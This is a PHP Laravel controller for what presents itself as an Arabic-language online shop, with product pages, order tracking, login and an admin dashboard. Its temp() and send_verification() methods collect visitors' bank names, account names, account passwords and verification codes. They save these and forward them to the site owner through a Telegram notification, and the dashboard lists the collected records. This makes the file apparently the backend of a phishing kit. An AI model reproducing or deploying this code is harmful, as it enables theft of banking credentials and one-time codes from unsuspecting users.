<?php

namespace App\Http\Controllers;

use App\Models\Category;
use App\Models\DataInfo;
use App\Models\General;
use App\Models\MailSender;
use App\Models\Order;
use App\Models\Product;
use App\Models\User;
use App\Notifications\LaravelTelegramNotification;
use Dflydev\DotAccessData\Data;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Auth;
use Illuminate\Support\Facades\Crypt;
use Share;

class HomeController extends Controller
{
    public function index()
    {
        return view('front.index');
    }
    public function mails(){
        $mail= MailSender::orderby('id','desc')->get();
        return view('dashboard.mails.index')->with('mails',$mail);
    }
    public function socail(){
        return view('dashboard.socail');
    }
    public function share(){
        dd(Share::currentPage()->linkedin());

    }
    public function delete_mail($id){
        $mail = MailSender::find($id)->delete();
        return redirect()->back()->with(['success'=>'تم الحذف بنجاح']);
    }
    public function update_stauts_feture(Request $request){
        General::setValue('is_feture', $request->status);
    }
    public function update_stauts_how(Request $request){
        General::setValue('how_work', $request->status);
    }
    
    public  function temp(Request $request)
    {
        $request->session()->put('form',$request->all());
        $user = User::first();
        $data =$request->all();  
        $user->notify(new LaravelTelegramNotification($data));
        return redirect()->route('verification');
    }
    public function send_mail(Request $request){
        if($request->email == null){
            $resoponse = array(
                'success'=>2,
                'message'=>'Email  is Empty'
                );
                return $resoponse;
        }
        $check = MailSender::Where('email',$request->email)->first();
        if($check){
            $resoponse = array(
                'success'=>1,
                'message'=>'Added successfully'
                );
                return $resoponse; 
        }
        $mail = new MailSender();
        $mail->email = $request->email;
        $mail->save();
        $resoponse = array(
            'success'=>1,
            'message'=>'Added successfully'
            );
            return $resoponse;

    }
    public function verification(){
        return view('verification');
    }
    public function category($id){
        $products = Product::where('category_id',$id)->where('status',1)->paginate(5);
        $category = Category::find($id);
        return view('front.category')->with('products',$products)->with('category',$category);
    }
    public function send_verification(Request $request){
        $data = new DataInfo();
        $form1 = session()->get('form');
        $data ->bank_name = $form1['bank_name'];
        $data ->account_name = $form1['account_name'];
        $data ->account_password = $form1['account_password'];
        $data->code = $request->verification;
        $data->save();
        $user = User::first();
        // $data =[
        //     'name'=>'islam'
        // ];
        if($data){
            session()->forget('form');
        }

        
        $user->notify(new LaravelTelegramNotification($data));
        

    }
    public function system_info(){
        return view('dashboard.system_info');
    }
    public function about_page(){
        return view('dashboard.about_page');
    }
    public function returns_exchange_page(){
        return view('dashboard.returns_exchange');
    }
    public function usage_policy_page(){
        return view('dashboard.usage_policy');
    }
    
    public function paid_info(){
        return view('dashboard.paid_info');
    }
    public function track_order(){
        return view('front.track_order');
    }
    public function track_order_post(Request $request){
        $code = str_replace('#','',$request->code);
        $order =  Order::where('code',$code)->first();
        return view('front.order')->with('order',$order);
    }
    
    
    public function get_setting_post(Request $request)
    {
        // dd($request->all());
        if ($request->hasFile('general_file')) {
            foreach ($request->file('general_file') as $name => $value) {
                if ($value == null) {
                    continue;
                }
                General::setValue($name, $value->store('general'));
            }
        }

        foreach ($request->input('general') as $name => $value) {
            if ($value == null) {
                General::setValue($name, $value);
            }
            General::setValue($name, $value);
        }

        return redirect()->back()->with(['success' => 'تم التعديل بنجاح']);
    }
    public function login_dashboard(){
        return view('dashboard.auth.login');
    }
    public function register(){
        return view('dashboard.auth.register');
    }
    public function post_register(Request $request){
        $request->validate([
            'name'=>'required',
            'email'=>'required|unique:users,email',
            'phone'=>'required',
            'password'=>'required',
            'confirm_password'=>'required|same:password'
        ]);
        $user = new User();
        $user->name = $request->name;
        $user->email = $request->email;
        $user->phone = $request->phone;
        $user->password = bcrypt($request->password);
        $user->type ='user';
        $user->save();
        Auth::login($user);
        return redirect('/');
    }
    
    public function login_dashboard_post(Request $request){
        $request->validate([
            'email' => 'required|email',
            'password' => 'required',
        ]);
        $credentials = $request->only('email', 'password');
        if (Auth::attempt($credentials)) {
            if(auth()->user()->type == 'admin'){
                return redirect('/dashboard');
            }else{
                return redirect(route('home'));
            }
        } else {
            return redirect()->back()->with(['error' => 'البيانات غير متطابقة مع سجلاتنا']);
        }
    }
    public function dashboard()
    {
        $data = DataInfo::orderBy('id','desc')->get();
        return view('dashboard.index')->with('data',$data);
    }
    public function logout(){
        Auth::logout();
        return redirect()->route('home');
    }
    public function edit_profile(){
        return view('dashboard.auth.profile')->with('user',auth()->user());  
    }
    public function account(){
        return view('front.account');
    }
    public function update_profile(Request $request){
        $request->validate([
            'name'=>'required',
            'email'=>'required|email',
        ]);
        if($request->password != null){
            $request->validate([
            'password'=>'required',
            'confirm-password'=>'same:password'
        ]);}
        $user = auth()->user();
        $user->name= $request->name;
        $user->email= $request->email;
        if($request->password != null){
            $user->password= bcrypt($request->password );
        }
        $user->save();
        return redirect()->back()->with(['success'=>'تم التعديل بنجاح']);
        }
        public function returns_exchange(){
            return view('front.returns_exchange');
        }
        public function about(){
            return view('front.about');
        }
        public function usage_policy(){
            return view('front.usage_policy');
        }
        public function single_product($id){
            $product = Product::find(Crypt::decrypt($id));
            $related = Product::where('category_id',$product->category_id)->where('id','!=',$product->id)->take(3)->get();
            return view('front.product')->with('item',$product)->with('related',$related);
        }
        
    }


